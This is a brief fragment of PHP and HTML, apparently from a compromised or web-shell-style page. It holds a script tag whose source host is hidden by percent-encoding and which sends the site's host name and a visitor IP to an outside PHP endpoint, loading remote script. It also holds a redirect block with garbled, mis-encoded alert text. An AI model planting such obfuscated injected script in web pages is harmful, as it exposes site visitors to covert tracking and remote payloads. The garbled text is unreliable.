...
<SCRIPT LANGUAGE="JavaScript" src="http://%36%2E%6D%79%65%65%61%2E%63%6F%6D/6hc/i.php?u=<?php echo $_SERVER['HTTP_HOST']?>&q=<?php echo $ip?>x6"></SCRIPT>
...
if ($i==1)
{?>
<script language="javascript"> alert("�Ƿ����ʣ�");top.location='x6.php?i=0'; </script>
<?php }?>